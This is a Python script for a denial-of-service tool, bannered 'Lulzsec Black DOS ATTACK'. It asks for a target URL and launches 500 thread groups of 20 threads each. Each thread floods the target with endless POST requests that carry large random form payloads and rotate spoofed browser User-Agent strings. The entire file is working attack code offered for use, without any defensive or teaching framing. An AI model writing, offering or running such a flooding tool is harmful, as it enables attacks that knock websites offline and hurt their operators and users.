import requests
import threading
import time
import pyfiglet
from colorama import Fore, Style, init
import random
import string


init()


ascii_banner = pyfiglet.figlet_format("Lulzsec Black DOS ATTACK")
print(Fore.RED + ascii_banner + Style.RESET_ALL)


url = input(Fore.YELLOW + "Enter target URL: " + Style.RESET_ALL)


data_list = [
    {'key1': ''.join(random.choices(string.ascii_letters + string.digits, k=2000)), 'key2': ''.join(random.choices(string.ascii_letters + string.digits, k=2000))},
    {'username': ''.join(random.choices(string.ascii_letters + string.digits, k=500)), 'password': ''.join(random.choices(string.ascii_letters + string.digits, k=500))},
    {'search': ''.join(random.choices(string.ascii_letters + string.digits, k=1000)), 'page': '1'},
    {'param1': ''.join(random.choices(string.ascii_letters + string.digits, k=1000)), 'param2': ''.join(random.choices(string.ascii_letters + string.digits, k=1000))},
    {'longtext': ''.join(random.choices(string.ascii_letters + string.digits, k=5000)), 'description': ''.join(random.choices(string.ascii_letters + string.digits, k=5000))},
    {'data1': ''.join(random.choices(string.ascii_letters + string.digits, k=10000)), 'data2': ''.join(random.choices(string.ascii_letters + string.digits, k=10000))}
]


user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1'
]


def send_post_request():
    while True:
        try:
            
            
            data = random.choice(data_list)
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.post(url, data=data, headers=headers)
            print(Fore.GREEN + f"Status Code: {response.status_code}" + Style.RESET_ALL)
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)


def start_robot():
    threads = []
    for _ in range(20):  
    
        thread = threading.Thread(target=send_post_request)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


def start_attack(robot_groups):
    for _ in range(robot_groups):
        robot = threading.Thread(target=start_robot)
        robot.start()
        time.sleep(0.005)  


robot_groups = 500  


start_attack(robot_groups)
